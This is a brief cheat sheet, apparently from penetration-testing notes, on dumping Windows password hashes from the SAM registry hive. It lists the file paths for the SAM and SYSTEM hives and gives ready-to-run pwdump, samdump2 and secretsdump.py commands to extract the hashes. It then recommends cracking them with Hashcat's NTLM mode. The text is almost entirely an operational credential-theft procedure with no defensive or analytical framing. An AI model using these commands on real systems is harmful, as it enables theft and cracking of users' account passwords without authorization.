## Here is what you need to dump the SAM hive if you should have acces to it:

## Common Locations:

%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

--> Make sure to grab the "SAM" and "SYSTEM"

## Dump the Password hashes:

pwdump SYSTEM SAM > /root/sam.txt

or

samdump2 SYSTEM SAM -o sam.txt

or

python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

## Crack with Hashcat

--> Use Hash mode #1000 for NTLM hashes!!!


## Remember "Used" SAM and SYSTEM filesa are dozens of MB large!!!

